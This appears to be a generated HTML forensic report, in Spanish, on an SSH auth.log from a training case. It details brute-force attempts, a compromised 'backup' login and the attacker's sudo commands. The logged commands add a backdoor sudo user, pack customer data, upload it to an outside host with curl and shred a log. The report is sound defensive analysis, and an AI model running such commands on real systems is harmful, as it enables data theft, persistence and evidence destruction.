@@ -1,0 +1,56 @@
+<!doctype html><html lang="es"><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Informe auth.log</title>
+<style>
+body{font-family:system-ui,sans-serif;max-width:980px;margin:auto;padding:16px;color:#1d2433;background:#f5f6f8}
+h1{margin-bottom:4px} h2{border-bottom:2px solid #1d2433;padding-bottom:4px;margin-top:32px}
+.meta{color:#555;font-size:14px} code{font-size:13px;word-break:break-all}
+table{border-collapse:collapse;width:100%;background:#fff;font-size:14px}
+th,td{text-align:left;padding:6px 8px;border-bottom:1px solid #e3e5ea;vertical-align:top}
+th{background:#eceef2}
+.barra{background:#c0392b;height:12px;border-radius:2px}
+.critico{background:#fdecea} .critico td:first-child{border-left:4px solid #c0392b}
+.ataque{background:#fff7e6} .etq{font-size:12px;color:#c0392b;font-weight:600}
+.alerta{background:#c0392b;color:#fff;padding:12px 16px;border-radius:6px}
+.ok{background:#27ae60;color:#fff;padding:12px 16px;border-radius:6px}
+.tarjetas{display:flex;gap:12px;flex-wrap:wrap} .tarjetas div{background:#fff;padding:10px 14px;border-radius:6px;flex:1;min-width:140px}
+.tarjetas b{display:block;font-size:24px}
+</style>
+<h1>Análisis de auth.log</h1>
+<p class="meta">Archivo: <code>../evidencia/caso3_servidor/auth.log</code><br>SHA-256: <code>09345a30445bda2cb1408d5dc99585f39e80037a2c748ecbe63dd1c8407237be</code><br>
+749 líneas · Nov 14 02:10:08 → Nov 14 08:02:00 · Generado 21/11/2026 17:34<br>
+<b>Ojo:</b> syslog no guarda año ni zona horaria; las horas son las del servidor (confirmar con <code>timedatectl</code>).</p>
+<div class="tarjetas"><div><b>741</b>intentos fallidos</div><div><b>3</b>IPs atacantes</div>
+<div><b>2</b>accesos exitosos</div><div><b>5</b>comandos sudo</div></div>
+<p class='alerta'><b>Probable intrusión</b> desde 203.0.113.77: acceso exitoso desde una IP con intentos fallidos previos. Conclusión automática, verificar.</p>
+<h2>Intentos fallidos por IP</h2><table><tr><th>IP</th><th>Fallos</th><th style='width:30%'></th><th>Ventana</th><th>Usuarios más probados</th></tr>
+<tr><td><code>198.51.100.23</code> <span class='etq'>FUERZA BRUTA</span></td><td>412</td><td><div class='barra' style='width:100%'></div></td><td>Nov 14 02:10:08 → Nov 14 05:09:56</td><td>root (41), test (40), ubuntu (38), oracle (36)</td></tr>
+<tr><td><code>203.0.113.77</code> <span class='etq'>FUERZA BRUTA</span></td><td>233</td><td><div class='barra' style='width:57%'></div></td><td>Nov 14 02:10:39 → Nov 14 05:09:41</td><td>admin (26), ubuntu (25), root (23), oracle (20)</td></tr>
+<tr><td><code>192.0.2.150</code> <span class='etq'>FUERZA BRUTA</span></td><td>96</td><td><div class='barra' style='width:23%'></div></td><td>Nov 14 02:12:50 → Nov 14 05:08:23</td><td>root (14), oracle (12), admin (12), postgres (8)</td></tr>
+</table>
+<h2>Accesos exitosos</h2><table><tr><th>Hora</th><th>Usuario</th><th>IP</th><th>Método</th><th>Fallos previos de esa IP</th></tr>
+<tr class='critico'><td>Nov 14 05:17:42</td><td>backup</td><td><code>203.0.113.77:44821</code></td><td>password</td><td>233</td></tr>
+<tr><td>Nov 14 08:02:00</td><td>admin</td><td><code>192.168.1.10:51022</code></td><td>publickey</td><td>—</td></tr>
+</table>
+<h2>Comandos con sudo</h2><table><tr><th>Hora</th><th>Usuario</th><th>Comando</th><th>Qué puede indicar</th></tr>
+<tr class='critico'><td>Nov 14 05:19:03</td><td>backup → root</td><td><code>/usr/sbin/useradd -m -s /bin/bash soporte2</code></td><td>persistencia (usuario nuevo)</td></tr>
+<tr class='critico'><td>Nov 14 05:19:40</td><td>backup → root</td><td><code>/usr/sbin/usermod -aG sudo soporte2</code></td><td>persistencia / privilegios</td></tr>
+<tr class='critico'><td>Nov 14 05:21:15</td><td>backup → root</td><td><code>/usr/bin/tar czf /tmp/.c.tgz /srv/clientes</code></td><td>empaquetado de datos</td></tr>
+<tr class='critico'><td>Nov 14 05:24:52</td><td>backup → root</td><td><code>/usr/bin/curl -T /tmp/.c.tgz http://198.51.100.200/up</code></td><td>conexión saliente / exfiltración</td></tr>
+<tr class='critico'><td>Nov 14 05:26:01</td><td>backup → root</td><td><code>/usr/bin/shred -u /var/log/apache2/access.log</code></td><td>antiforense (borrado seguro)</td></tr>
+</table>
+<h2>Línea de tiempo</h2><table><tr><th>Hora</th><th>Evento</th></tr>
+<tr class='ataque'><td>Nov 14 02:10:08</td><td>Comienzan los fallos desde 198.51.100.23</td></tr>
+<tr class='ataque'><td>Nov 14 02:10:39</td><td>Comienzan los fallos desde 203.0.113.77</td></tr>
+<tr class='ataque'><td>Nov 14 02:12:50</td><td>Comienzan los fallos desde 192.0.2.150</td></tr>
+<tr class='ataque'><td>Nov 14 05:08:23</td><td>Último fallo desde 192.0.2.150 (96 en total)</td></tr>
+<tr class='ataque'><td>Nov 14 05:09:41</td><td>Último fallo desde 203.0.113.77 (233 en total)</td></tr>
+<tr class='ataque'><td>Nov 14 05:09:56</td><td>Último fallo desde 198.51.100.23 (412 en total)</td></tr>
+<tr class='critico'><td>Nov 14 05:17:42</td><td>Acceso exitoso: backup desde 203.0.113.77 (password)</td></tr>
+<tr class='critico'><td>Nov 14 05:19:03</td><td>sudo (backup): /usr/sbin/useradd -m -s /bin/bash soporte2</td></tr>
+<tr class='critico'><td>Nov 14 05:19:40</td><td>sudo (backup): /usr/sbin/usermod -aG sudo soporte2</td></tr>
+<tr class='critico'><td>Nov 14 05:21:15</td><td>sudo (backup): /usr/bin/tar czf /tmp/.c.tgz /srv/clientes</td></tr>
+<tr class='critico'><td>Nov 14 05:24:52</td><td>sudo (backup): /usr/bin/curl -T /tmp/.c.tgz http://198.51.100.200/up</td></tr>
+<tr class='critico'><td>Nov 14 05:26:01</td><td>sudo (backup): /usr/bin/shred -u /var/log/apache2/access.log</td></tr>
+<tr class='normal'><td>Nov 14 08:02:00</td><td>Acceso exitoso: admin desde 192.168.1.10 (publickey)</td></tr>
+</table><p class='meta'>Generado con auth_log.py. Las marcas en rojo son indicios para revisar, no conclusiones: cada una se confirma contra el log original.</p></html>
